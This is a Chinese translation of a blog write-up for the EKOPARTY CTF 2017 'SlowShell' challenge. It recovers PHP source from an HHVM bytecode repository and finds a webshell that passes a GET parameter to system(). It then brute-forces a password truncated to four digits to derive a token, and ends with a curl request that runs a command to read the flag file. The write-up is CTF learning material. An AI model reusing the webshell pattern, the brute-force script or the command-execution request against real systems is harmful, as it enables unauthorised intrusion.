---
title: "EKOPARTY CTF 2017: SlowShell （译）"
date: 2019-04-24T23:45:13+08:00
categories: ["blog"]
tags: ["codisec CTF"]
description: "关于，codisec.com CTF 团队博客的中文翻译，其中有对挑战的思考与解决过程"
css:
  [
    '/css/main.css',
    '/css/stylesheet.css',
    'https://codisec.com/wp-content/themes/codisec-strappress/style.css?ver=3.3.6',
  ]
series: 'Codisec.com 的 CTF团队博客 - 中文翻译'
draft: false
---


<style>
body{
    background-color: #272b30;
    color:#f9f1f1;
    font-size:1.1em;
}

a {
  color:#f1851a;
}
pre {
    background-color: #272b30;
}
p {
    color: #c8c8c8;
}

li code,
p code {
    background-color: rgb(34, 40, 42) !important;
    color: #f1851a;
}
div.inner {
    background-color: #272b30;
}
</style>

## 博文来源

> [源文](https://codisec.com/ekoparty-ctf-2017-slowshell/) ：2017 9-29 ，作者：[Hubert Jasudowicz](https://codisec.com/author/hubert-jasudowicz/)

- CTF：EKOPARTY CTF 2017
- 积分：498（由 2 支团队解决）
- 类别：Web，RE

## 描述

在这次挑战中，我们获得了一个 Web 服务器 URL -<http://hhvm.ctf.site:10080/>，和两个用于运行服务的 shell 命令：

```bash
$ hhvm --hphp -t hhbc -v AllVolatile=true --input-dir . -o HHVM
```

和：

```bash
$ hhvm -m server -d hhvm.server.type=proxygen \
                 -d hhvm.server.port=8080 \
                 -d hhvm.repo.authoritative=true \
                 -d hhvm.repo.central.path=./HHVM/hhvm.hhbc
```

## 关于 hhvm

HHVM 是由 Facebook 开发的 PHP 虚拟机，它使用 JIT 加速代码执行。PHP 脚本转换为 `HipHop 字节码-bytecode`（HHBC），进行优化，然后编译为原生机器码。

默认情况下，HHVM 与 Zend Engine 的工作方式类似 - 它根据需要加载和运行 PHP 文件。虽然灵活，但这种方法效率极低，因为它几乎没有进行高级优化的空间。另一种方法是使用“repo authoritative”模式（在此挑战中使用），该模式的 HHVM 会构建 SQLite3 数据库（`hhvm.hhbc`），具有高度优化的字节码，以及运行所有脚本所需的其他元数据。

## 解

### 获取 hhvm.hhbc

我们需要做的第一件事是提取 储存 文件。幸运的是，它很容易访问，因为 Proxygen（内置 HTTP 服务器）会提供，运行目录中的所有文件。我们只要运行：

```bash
$ wget http://hhvm.ctf.site:10080/HHVM/hhvm.hhbc
```

你可以在[这里](https://codisec.com/wp-content/uploads/2017/09/hhvm.hhbc_.zip)下载。

### 发现 PHP 文件

现在，当我们有 储存 文件时，我们可以看到这幕后到底发生了什么。首先，让我们看看，在服务器上，可以找到哪些端点。为此，我们可以简单地加载数据库，并查看提示。其中一个有趣的表格包含：

![database-table](https://codisec.com/wp-content/uploads/2017/09/files.png)

### 转储成字节码

下一步是找出这两个 php 脚本，正在做什么。为此，我们可以将`-vEval.DumpBytecode = 1`标志，传递给 HHVM。

```bash
$ hhvm -d hhvm.repo.authoritative=true \
       -d hhvm.repo.central.path=./HHVM/hhvm.hhbc \
       -vEval.DumpBytecode=1 [filename]
```

这命令将从储存文件中，提取并打印 HipHop 字节码。我已经包含了两个转储文件，以供参考，但我将跳过手动“逆转” PHP 代码这一步。我鼓励你自己尝试分析 HHBC。它作为一个简单的[堆栈结构机器](https://en.wikipedia.org/wiki/Stack_machine)，其工作形式值得我们熟悉。在[这里](https://github.com/facebook/hhvm/blob/master/hphp/doc/bytecode.specification)查看 HHBC 规范。

> 下面是两个 php 文件的 HipHop 字节码。

#### shell.php：

<details>

```php
Pseudo-main at 0
repoReturnType: Int
maxStackCells: 5
numLocals: 2
numIterators: 0
numClsRefSlots: 0
  // line 3
    0: String "/etc/slow-auth.ini"
    5: False
    6: Int 0
   15: AssertRATStk 1 Bool
   18: AssertRATStk 2 SStr
   21: FCallBuiltin 3 1 "parse_ini_file"
   28: UnboxRNop
   29: SetL L:0
   31: PopC
  // line 5
   32: String "_GET"
   37: AssertRATStk 0 SStr
   40: BaseGC 0 None
   44: AssertRATStk 0 SStr
   47: QueryM 1 Empty ET:"token"
   56: AssertRATStk 0 Bool
   59: JmpNZ 124 (183)
   64: String "_GET"
   69: AssertRATStk 0 SStr
   72: BaseGC 0 None
   76: AssertRATStk 0 SStr
   79: QueryM 1 Empty ET:"cmd"
   88: AssertRATStk 0 Bool
   91: JmpNZ 92 (183)
   96: String "_GET"
  101: AssertRATStk 0 SStr
  104: BaseGC 0 Warn
  108: AssertRATStk 0 SStr
  111: QueryM 1 CGet ET:"token"
  120: BaseL L:0 Warn
  124: QueryM 0 CGet ET:"token"
  133: Same
  134: JmpZ 49 (183)
  // line 6
  139: String "Welcome admin!<br/>"
  144: Print
  145: PopC
  // line 7
  146: String "_GET"
  151: AssertRATStk 0 SStr
  154: BaseGC 0 Warn
  158: AssertRATStk 0 SStr
  161: QueryM 1 CGet ET:"cmd"
  170: NullUninit
  171: FCallBuiltin 2 1 "system"
  178: UnboxRNop
  179: AssertRATStk 0 ?Str
  182: PopC
  183: Int 1
  192: RetC
Pseudo-main at 0
repoReturnType: Int
maxStackCells: 5
numLocals: 2
numIterators: 0
numClsRefSlots: 0
```

</details>

#### shell-login.php:

<details>

```php
Pseudo-main at 0
repoReturnType: Int
maxStackCells: 12
numLocals: 6
numIterators: 0
numClsRefSlots: 0
 FPI 214-234; fpOff = 9
 FPI 253-287; fpOff = 9
  // line 3
    0: String "_POST"
    5: EmptyG
    6: JmpNZ 369 (375)
  // line 4
   11: String "_POST"
   16: AssertRATStk 0 SStr
   19: BaseGC 0 Warn
   23: AssertRATStk 0 SStr
   26: QueryM 1 CGet ET:"username"
   35: Int 0
   44: Int 32
   53: AssertRATStk 1 Int
   56: FCallBuiltin 3 3 "substr"
   63: UnboxRNop
   64: SetL L:1
   66: PopC
  // line 5
   67: String "_POST"
   72: AssertRATStk 0 SStr
   75: BaseGC 0 Warn
   79: AssertRATStk 0 SStr
   82: QueryM 1 CGet ET:"password"
   91: Int 0
  100: Int 4
  109: AssertRATStk 1 Int
  112: FCallBuiltin 3 3 "substr"
  119: UnboxRNop
  120: CastInt
  121: CastString
  122: SetL L:2
  124: PopC
  // line 6
  125: Int 0
  134: SetL L:3
  // line 8
  136: PopC
  // line 6
  137: Int 16
  146: CGetL2 L:3
  148: AssertRATStk 0 Int
  151: Lt
  152: JmpZ 46 (198)
  // line 7
  157: CGetL L:2
  159: False
  160: FCallBuiltin 2 1 "md5"
  167: UnboxRNop
  168: AssertRATStk 0 ?Str
  171: SetL L:2
  173: PopC
  // line 6
  174: IncDecL L:3 PostIncO
  // line 8
  177: PopC
  // line 6
  178: Int 16
  187: CGetL2 L:3
  189: AssertRATStk 0 Int
  192: Lt
  193: JmpNZ -36 (157)
  // line 10
  198: String "EKO-ADMIN"
  203: CGetL2 L:1
  205: AssertRATStk 0 SStr
  208: Same
  209: JmpZ 158 (367)
  214: FPushFuncD 2 "password_verify"
  220: CGetL L:2
  222: FPassC 0
  224: String "$2y$12$tQdBpH9ZlMomuSxwpw/5Iuxe4xTdu8RbBG4ODCxyZPM0Hl3vpkC4q"
  229: FPassC 1
  231: AssertRATStk 0 SStr
  234: FCallD 2 "" "password_verify"
  244: UnboxRNop
  245: AssertRATStk 0 Bool
  248: JmpZ 119 (367)
  // line 11
  253: FPushFuncD 3 "password_hash"
  259: CGetL L:2
  261: FPassC 0
  263: Int 1
  272: FPassC 1
  274: Array array("cost"=>24,"salt"=>"3165613164316437343131346634616663323364623631393534316630336634653663353466373638373835")
  279: FPassC 2
  281: AssertRATStk 0 SArr
  284: AssertRATStk 1 Int
  287: FCallD 3 "" "password_hash"
  297: UnboxRNop
  298: False
  299: FCallBuiltin 2 1 "md5"
  306: UnboxRNop
  307: AssertRATStk 0 ?Str
  310: SetL L:4
  312: PopC
  // line 12
  313: String "Location: shell.php\?token="
  318: String "&cmd=cat%20/etc/slow-webshell.txt"
  323: CGetL2 L:4
  325: AssertRATStk 0 SStr
  328: Concat
  329: AssertRATStk 1 SStr
  332: ConcatN 2
  334: True
  335: Int 0
  344: AssertRATStk 1 Bool
  347: AssertRATStk 2 Str
  350: FCallBuiltin 3 1 "header"
  357: UnboxRNop
  358: AssertRATStk 0 InitNull
  361: PopC
  362: Jmp 13 (375)
  // line 14
  367: String "<strong>Invalid username or password</strong>"
  372: SetL L:5
  374: PopC
  // line 21
  375: String "<html>\n <head>\n  <title>Slow Webshell</title>\n  "
  380: Print
  381: PopC
  382: String "<s"
  387: Print
  388: PopC
  // line 29
  389: String "tyle>\n   .login-form {text-align: center;}\n   input {margin: 5px;}\n  </style>\n </head>\n <body>\n  <div class=\"login-form\">\n   <h2>Slow Webshell</h2>\n   "
  394: Print
  395: PopC
  396: EmptyL L:5
  398: JmpNZ 9 (407)
  403: CGetL L:5
  405: Print
  406: PopC
  // line 37
  407: String "   <form method=\"POST\">\n    <input type=\"text\" name=\"username\" placeholder=\"username\" required /><br/>\n    <input type=\"password\" name=\"password\" placeholder=\"password\" required /><br/>\n    <input type=\"submit\" name=\"submit\" value=\"Authenticate\" />\n   </form>\n  </div>\n </body>\n</html>\n"
  412: Print
  413: PopC
  414: Int 1
  423: RetC
Pseudo-main at 0
repoReturnType: Int
maxStackCells: 12
numLocals: 6
numIterators: 0
numClsRefSlots: 0
 FPI 214-234; fpOff = 9
 FPI 253-287; fpOff = 9
```

</details>

### 漏洞

好了，下面我们已经将字节码重写为 PHP，我们可以寻找一种方法，来对服务器进行`pwn`。

> `pwn`是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”。

#### shell.php：

```shell
$conf = parse_ini_file("/etc/slow-auth.ini");
if ($_GET['token'] && $_GET['cmd']) {
	if ($_GET['token'] == $conf['token']) {
		echo "Welcome admin!<br/>";
		system($_GET['cmd']);
	}
}
```

此脚本可以运行任何 shell 命令，但需要未知令牌(token)。我们暂时离开下，继续。

#### shell-login.php：

```php
if (isset($_POST)) {
	$user = substr($_POST['username'], 0, 32);
	$pass = substr($_POST['password'], 0, 4); // ❤️

	$pass = strval(intval($pass)); // ❤️

	for ($i = 0; $i < 16; $i++) {
		$pass = md5($pass);
	}

	if ($user == 'EKO-ADMIN' && password_verify($pass, '$2y$12$tQdBpH9ZlMomuSxwpw/5Iuxe4xTdu8RbBG4ODCxyZPM0Hl3vpkC4q')) {
		$options = [
			'cost' => 24,
			'salt' => "3165613164316437343131346634616663323364623631393534316630336634653663353466373638373835"
		];
		$token = md5(password_hash($pass, PASSWORD_BCRYPT, $options));
		header("Location: shell.php?token=" . $token . "&cmd=cat%20/etc/slow-webshell.txt");
	} else {
		$error = "<strong>Invalid username or password</strong>";
	}
}
	echo "<html>....";
	echo "<style>....";

	if ($error) {
		echo $error;
	}

	echo "<form>.....";

?>
```

这脚本更有趣。要生成有效的令牌，我们必须发送正确的密码，但是正如在 ❤️ 代码行，所看到的那样，密码被截断为 4 个字母，然后转换为整数。这些转换将搜索空间，减少到最多 4 位数的数字 - 10 000 (0~9999)个不同的密码。此外，登录后，会生成一个令牌，我们将被重定向到`/shell.php?token=[token]&cmd=cat%20/etc/slow-webshell.txt`，因此这可能是包含得分旗帜 🚩 的文件。

### 登录吧

好的，现在我们知道要进入 shell 的所有内容。首先要做的，就是破解密码。我们将通过简单地遍历所有 10 000 个数字，计算 16xMD5 哈希作为密钥，并使用 `password_verify` 进行最终验证，来完成此操作。找到有效密码后，我们有两个选择：在登录表单中使用，让服务器计算出有效令牌。或是在本地生成它，并直接访问 `shell.php`。

这是一个找到密码和令牌的脚本（警告 - 需要很长时间才能完成）

```php
<<?php
function md5calc($s) {
        for ($i = 0; $i < 16; $i++) {
                $s = md5($s);
        }
        return $s;
}

function print_token($p) {
        $options = [
                'cost' => 24,
                'salt' => "3165613164316437343131346634616663323364623631393534316630336634653663353466373638373835"
        ];
        $token = md5(password_hash($p, PASSWORD_BCRYPT, $options));
        echo "Token: $token\n";
}

for ($i = 0; $i < 10000; $i++) {
        $pass = strval($i);
        $pass = md5calc($pass);
        if (password_verify($pass, '$2y$12$tQdBpH9ZlMomuSxwpw/5Iuxe4xTdu8RbBG4ODCxyZPM0Hl3vpkC4q')) {
                echo "Password: $i\n";
                print_token($pass);
                break;
        }
}

?>
```

在找到令牌后, 我们简单 `curl` 来自 `shell-login.php` 的 URL，并夺得旗帜：

```bash
$ curl "http://hhvm.ctf.site:10080/shell.php?token=8b5e48da54af5ef22fbd1045c10d3d58&cmd=cat%20/etc/slow-webshell.txt"...EKO{m4st3r+of+HHVM+0pc0d35}...
```

